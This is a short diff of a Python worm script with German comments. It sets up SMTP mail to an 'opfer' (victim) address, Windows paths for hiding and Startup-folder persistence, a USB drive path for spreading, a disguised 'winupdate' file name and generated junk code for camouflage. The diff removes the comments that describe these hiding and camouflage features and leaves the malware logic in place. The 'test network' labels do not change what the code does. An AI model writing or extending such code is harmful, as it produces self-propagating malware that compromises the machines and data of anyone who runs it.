@@ -31,16 +31,15 @@ SMTP_SERVER = "192.168.1.100"  # Ersetze mit IP des Test-Mailservers
 SMTP_PORT = 25  # Port für unverschlüsseltes SMTP
 SENDER_EMAIL = "infiziert@testnetz.local"
 RECIPIENT_EMAIL = "opfer@testnetz.local"
-# 🔹 Wichtige Windows-Verzeichnisse für Verstecken & Autostart
+
 hidden_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\")
 startup_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
 usb_path = "E:\\"  # Beispiel für USB-Laufwerk
 
-# 🔹 Zufällige Werte für Namen
 rnd1 = random.randint(1000, 9999)
 worm_name = f"winupdate_{rnd1}.py"
 
-# 🔹 Junk-Code für Tarnung
+
 junk_code = f"""
 def fake_function_{rnd1}():
     var_{rnd1} = {random.randint(1, 100)}
